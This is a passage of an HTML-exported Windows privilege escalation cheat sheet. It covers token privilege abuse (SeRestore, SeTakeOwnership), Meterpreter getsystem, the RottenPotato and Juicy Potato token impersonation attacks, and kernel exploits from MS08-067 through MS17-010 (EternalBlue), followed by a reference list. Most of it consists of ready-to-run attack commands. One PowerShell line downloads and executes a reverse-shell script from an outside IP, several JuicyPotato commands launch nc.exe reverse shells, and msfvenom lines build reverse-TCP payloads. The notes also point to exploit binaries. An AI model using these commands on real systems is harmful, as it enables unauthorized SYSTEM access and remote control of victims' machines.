class="selected-value">Admin</span></td><td class="cell-{=w[">PowerShell</td><td class="cell-*t+6">1. Launch PowerShell/ISE with the SeRestore privilege present.2. Enable the privilege with Enable-SeRestorePrivilege).3. Rename utilman.exe to utilman.old4. Rename cmd.exe to utilman.exe5. Lock the console and press Win+U</td><td class="cell-Bf&quot;5">Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in “Program Files” using the same privilege.</td></tr><tr id="f550fe85-ab80-468d-b0df-0f185ed1232f"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeTakeOwnership.html">SeTakeOwnership</a></td><td class="cell-7Ozx"><span class="selected-value">Admin</span></td><td class="cell-{=w[">Built-in commands</td><td class="cell-*t+6">1. takeown.exe /f &quot;%windir%\system32&quot;2. icalcs.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F3. Rename cmd.exe to utilman.exe4. Lock the console and press Win+U</td><td class="cell-Bf&quot;5">Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in “Program Files” using the same privilege.</td></tr><tr id="a5bc565e-0829-4874-b601-5f64ffaeb00d"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeTcb.html">SeTcb</a></td><td class="cell-7Ozx"><span class="selected-value">Admin</span></td><td class="cell-{=w[">3rd party tool</td><td class="cell-*t+6">Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified.</td><td class="cell-Bf&quot;5"></td></tr></tbody></table></div><h3 id="aa841ca1-c983-41d3-9ffd-840e11020f97" class="">Meterpreter getsystem and alternatives</h3><pre id="96322929-5a77-4a2f-806b-85b65f0a759f" class="code"><code>meterpreter&gt; getsystemTokenvator.exe getsystem cmd.exeincognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exepsexec -s -i cmd.exepython getsystem.py # from https://github.com/sailay1996/tokenx_privEsc</code></pre><h3 id="b4715e22-93cb-4995-abd4-f52220f4ece2" class="">RottenPotato (Token Impersonation)</h3><p id="33557356-ab43-4b33-9cca-b485afddfa11" class="">Binary available at : https://github.com/foxglovesec/RottenPotato Binary available at : https://github.com/breenmachine/RottenPotatoNG</p><pre id="001ae168-c72d-4fa4-94c0-c8f26e4d9bbb" class="code"><code>getuidgetprivsuse incognitolist\_tokens -ucd c:\temp\execute -Hc -f ./rot.exeimpersonate\_token &quot;NT AUTHORITY\SYSTEM&quot;</code></pre><pre id="a252c37c-d0d3-4fc5-b9e8-0eaad6b50889" class="code"><code>Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;Invoke-TokenManipulation -ImpersonateUser -Username &quot;NT AUTHORITY\SYSTEM&quot;Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;Powershell.exe -nop -exec bypass -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.7.253.6:82/Invoke-PowerShellTcp.ps1&#x27;);\&quot;};&quot;</code></pre><h3 id="636aae4e-55aa-46a3-b5a2-c0d56364eee2" class="">Juicy Potato (abusing the golden privileges)</h3><p id="3d3f0b9b-a284-42d1-8899-8bdc5e3352aa" class="">Binary available at : https://github.com/ohpe/juicy-potato/releases
:warning: Juicy Potato doesn’t work on Windows Server 2019 and Windows 10 1809.</p><ol id="5c8631b0-2d08-4405-968b-2917e6fd8003" class="numbered-list" start="1"><li>Check the privileges of the service account, you should look for <strong>SeImpersonate</strong> and/or <strong>SeAssignPrimaryToken</strong> (Impersonate a client after authentication)<pre id="d8e5cf02-a27f-4a7b-8dae-b5e012429a64" class="code"><code>whoami /priv</code></pre></li></ol><ol id="a4543f5e-6319-4983-8c1a-af6119326d90" class="numbered-list" start="2"><li>Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object<ul id="aa895328-894a-4945-b2f9-ca03c9b9b617" class="bulleted-list"><li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise">Windows 7 Enterprise</a></li></ul><ul id="6a896a90-dd26-4f6f-a38b-f00c0fd4377d" class="bulleted-list"><li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise">Windows 8.1 Enterprise</a></li></ul><ul id="7bbb7e2f-e310-4cdc-ab30-c1332f33222f" class="bulleted-list"><li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise">Windows 10 Enterprise</a></li></ul><ul id="52bcad84-2f7b-4c4a-8356-09d6860bf2b8" class="bulleted-list"><li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro">Windows 10 Professional</a></li></ul><ul id="7b3fb63a-361f-4dad-9dea-25d972dd8504" class="bulleted-list"><li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise">Windows Server 2008 R2 Enterprise</a></li></ul><ul id="a5b651fb-22fe-4090-a260-7287e239b414" class="bulleted-list"><li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter">Windows Server 2012 Datacenter</a></li></ul><ul id="a84aab6d-39c7-42ce-a0e5-d846874b4761" class="bulleted-list"><li><a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard">Windows Server 2016 Standard</a></li></ul></li></ol><ol id="7e33b491-8b51-422e-b565-5adb6ac88535" class="numbered-list" start="3"><li>Execute JuicyPotato to run a privileged command.<pre id="08c21088-0877-4d28-a62a-423e524f7c60" class="code"><code>JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a &quot;IP PORT -e cmd.exe&quot; -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a &quot;/c c:\users\User\reverse_shell.exe&quot;Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337......[+] authresult 0{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM[+] CreateProcessWithTokenW OK</code></pre></li></ol><h2 id="8fd1eaf4-fb9f-40c9-a1d5-81aab28f0951" class="">EoP - Common Vulnerabilities and Exposure</h2><h3 id="64b78ec9-d239-4c86-bb50-85a4ef9fff55" class="">MS08-067 (NetAPI)</h3><p id="e2764053-5e68-4b3d-8bd2-bec3fa4f569e" class="">Check the vulnerability with the following nmap script.</p><pre id="c0b21fa2-7387-4457-b190-3d0f3d4eb981" class="code"><code>nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 &lt;ip_netblock&gt;</code></pre><p id="75cb0b9a-e737-4942-a02f-6c8e66db3de2" class="">Metasploit modules to exploit <code>MS08-067 NetAPI</code>.</p><pre id="c429ee64-fffc-470f-93fb-87d53d43a60b" class="code"><code>exploit/windows/smb/ms08_067_netapi</code></pre><p id="d1f75e11-472d-4a12-9ab3-e7a13ad241ca" class="">If you can’t use Metasploit and only want a reverse shell.</p><pre id="0dbc38ee-dbac-4ebe-a380-25fcfc49d9e1" class="code"><code>https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.pymsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f py -v shellcode -a x86 --platform windowsExample: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 UniversalExample: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 EnglishExample: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)python ms08-067.py 10.0.0.1 6 445</code></pre><h3 id="80f051bd-6777-4688-8fca-e78550992531" class="">MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7</h3><p id="2937e517-a25b-4136-b563-091c98d36ca7" class="">‘KiTrap0D’ User Mode to Ring Escalation (MS10-015)</p><pre id="955463e4-f93d-45d5-b28c-bacddde91719" class="code"><code>https://www.exploit-db.com/exploits/11199Metasploit : exploit/windows/local/ms10_015_kitrap0d</code></pre><h3 id="9f53d3c1-1f2a-48fe-b7dd-648547f1e7cd" class="">MS11-080 (afd.sys) - Microsoft Windows XP/2003</h3><pre id="3e873394-a90d-4a3e-9409-b688b078a640" class="code"><code>Python: https://www.exploit-db.com/exploits/18176Metasploit: exploit/windows/local/ms11_080_afdjoinleaf</code></pre><h3 id="2e145690-7e16-4dfe-a62a-3033f53de4fb" class="">MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012</h3><pre id="c799b05e-9220-4fec-bdf0-39832b089d19" class="code"><code>printf(&quot;[#] usage: ms15-051 command \n&quot;);printf(&quot;[#] eg: ms15-051 \&quot;whoami /all\&quot; \n&quot;);# x32https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe# x64https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exehttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051use exploit/windows/local/ms15_051_client_copy_image</code></pre><h3 id="0fadb868-793b-4874-9d91-c35c31d25bd7" class="">MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)</h3><p id="7f1d007e-dffd-4b18-aff1-34f65f7908c3" class="">Check if the patch is installed : <code>wmic qfe list | findstr &quot;3139914&quot;</code></p><pre id="0b030a3e-eb5f-418f-865e-a5664b0551a0" class="code"><code>Powershell:https://www.exploit-db.com/exploits/39719/https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1Binary exe : https://github.com/Meatballs1/ms16-032Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code></pre><h3 id="92627c62-76b3-43e3-a82b-32f9e2780314" class="">MS17-010 (Eternal Blue)</h3><p id="67bf35f4-4845-4974-ab34-7153b8df4433" class="">Check the vulnerability with the following nmap script.</p><pre id="4b255eab-e530-4d4c-80c7-6e20d436306d" class="code"><code>nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 &lt;ip_netblock&gt;</code></pre><p id="df62b674-5c54-44e1-a5cd-24a66d56972f" class="">Metasploit modules to exploit <code>EternalRomance/EternalSynergy/EternalChampion</code>.</p><pre id="a52d5b12-60c9-4aa2-b387-f528d83a78a8" class="code"><code>auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Executionauxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detectionexploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruptionexploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</code></pre><p id="e9e43198-b95a-401b-88e9-b0b2657ed6f3" class="">If you can’t use Metasploit and only want a reverse shell.</p><pre id="f54a7ccf-8dfa-49a5-958e-a970bb065f59" class="code"><code>git clone https://github.com/helviojunior/MS17-010# generate a simple reverse shell to usemsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exepython2 send_and_execute.py 10.0.0.1 revshell.exe</code></pre><h3 id="7399eb68-e598-4282-a1dd-425594b52944" class="">CVE-2019-1388</h3><p id="4ad873bb-6e4a-42df-8dfa-40cb8cf9b0f1" class="">Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html</p><p id="6b6480e5-5443-4add-b6ee-a01d0a0b9371" class="">Working on : - Windows 7 - Windows 10 LTSC 10240</p><p id="9a2bf202-951f-495e-98f6-cfc524f09b09" class="">Failing on : - LTSC 2019 - 1709 - 1803</p><p id="65bbe687-45b3-4987-afd0-a22cce575f69" class="">Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege</p><h2 id="765589bf-f0de-4b40-9fa9-08f3a7a7394b" class="">References</h2><ul id="3e6a0563-05f0-4330-b475-c758fd72682e" class="bulleted-list"><li><a href="https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals">Windows Internals Book - 02/07/2017</a></li></ul><ul id="194dd5dc-6c7c-4d28-8e11-ab71f7a013ae" class="bulleted-list"><li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">icacls - Docs Microsoft</a></li></ul><ul id="a26977e8-693e-48c5-ac2f-ef9901a18adb" class="bulleted-list"><li><a href="https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html">Privilege Escalation Windows - Philip Linghammar</a></li></ul><ul id="35a457bf-8b8a-45ae-93d5-9d8c9aff730a" class="bulleted-list"><li><a href="https://guif.re/windowseop">Windows elevation of privileges - Guifre Ruiz</a></li></ul><ul id="e2102231-286e-4474-80ac-1a0e8e686bf7" class="bulleted-list"><li>[The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)</li></ul><ul id="f62dd1e6-0547-49fe-ba2b-ae42c69d0a98" class="bulleted-list"><li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></li></ul><ul id="2c2bb81c-fa3c-4a92-87b4-f7f0b82da6c7" class="bulleted-list"><li><a href="http://www.fuzzysecurity.com/tutorials/16.html">Windows Privilege Escalation Fundamentals</a></li></ul><ul id="676876dd-b1f3-434a-b6d6-24c60c8db658" class="bulleted-list"><li><a href="https://hackmag.com/security/elevating-privileges-to-administrative-and-further/">TOP–10 ways to boost your privileges in Windows systems - hackmag</a></li></ul><ul id="7f52d20b-37bd-45e0-845a-d1a38cdd6cb6" class="bulleted-list"><li><a href="https://decoder.cloud/2017/02/21/the-system-challenge/">The SYSTEM Challenge</a></li></ul><ul id="21d865c2-439d-4b1c-859a-eb6354475ddb" class="bulleted-list"><li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">Windows Privilege Escalation Guide - absolomb’s security blog</a></li></ul><ul id="83c696d8-d774-41df-ad63-76fa1152cbfa" class="bulleted-list"><li><a href="https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md">Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs</a></li></ul><ul id="c8a28c2f-faeb-4434-a9be-57c8e58137e5" class="bulleted-list"><li><a href="https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/">Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell</a></li></ul><ul id="ca3addf8-689e-470e-ad78-0c22a159611e" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/04/19/stored-credentials/">Pentestlab.blog - WPE-01 - Stored Credentials</a></li></ul><ul id="f31e7e91-5b1e-459a-96b2-d7c7d3b540a8" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/04/24/windows-kernel-exploits/">Pentestlab.blog - WPE-02 - Windows Kernel</a></li></ul><ul id="3b92bce2-35bf-4606-a071-7866ab47eca6" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/04/04/dll-injection/">Pentestlab.blog - WPE-03 - DLL Injection</a></li></ul><ul id="abace8c6-3d51-4836-9242-1e88b1ebaca5" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/03/30/weak-service-permissions/">Pentestlab.blog - WPE-04 - Weak Service Permissions</a></li></ul><ul id="6cfc5603-b8d1-4450-bec9-c2e9138fc395" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/03/27/dll-hijacking/">Pentestlab.blog - WPE-05 - DLL Hijacking</a></li></ul><ul id="791776f4-3b27-4f75-9aa4-e1fbb2a2922b" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/04/13/hot-potato/">Pentestlab.blog - WPE-06 - Hot Potato</a></li></ul><ul id="8f92bad0-916f-406e-86af-1e5659eea541" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/03/20/group-policy-preferences/">Pentestlab.blog - WPE-07 - Group Policy Preferences</a></li></ul><ul id="659f73c2-3cb3-444a-a666-c7d9fc23f25c" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/03/09/unquoted-service-path/">Pentestlab.blog - WPE-08 - Unquoted Service Path</a></li></ul><ul id="0f7c0301-2ad7-4e0d-9376-2d19a4baeae7" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/02/28/always-install-elevated/">Pentestlab.blog - WPE-09 - Always Install Elevated</a></li></ul><ul id="aef2ef1f-63af-47de-9bd5-3693564185b0" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/04/03/token-manipulation/">Pentestlab.blog - WPE-10 - Token Manipulation</a></li></ul><ul id="c135dcb4-7a5b-4cc5-b892-174408c8fdf5" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/04/07/secondary-logon-handle/">Pentestlab.blog - WPE-11 - Secondary Logon Handle</a></li></ul><ul id="59f64bf1-b994-4643-af0b-59c9c040b6ee" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/03/31/insecure-registry-permissions/">Pentestlab.blog - WPE-12 - Insecure Registry Permissions</a></li></ul><ul id="c4bede63-5a06-45fa-9397-9decc9cb735e" class="bulleted-list"><li><a href="https://pentestlab.blog/2017/06/14/intel-sysret/">Pentestlab.blog - WPE-13 - Intel SYSRET</a></li></ul><ul id="0dda3afd-cbcd-4d09-ab03-abee1e1981ed" class="bulleted-list"><li>[Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)</li></ul><ul id="7c9bc8f0-635e-486e-b066-62637dc60956" class="bulleted-list"><li><a href="https://github.com/LOLBAS-Project/LOLBAS">Living Off The Land Binaries and Scripts (and now also Libraries)</a></li></ul><ul id="e4949788-7db4-4012-89e8-9182f8ab27cd" class="bulleted-list"><li>[Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)</li></ul><ul id="2cd9ebe0-346d-4abb-b0a3-32fb7185c660" class="bulleted-list"><li>[Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)</li></ul></div></article></body></html>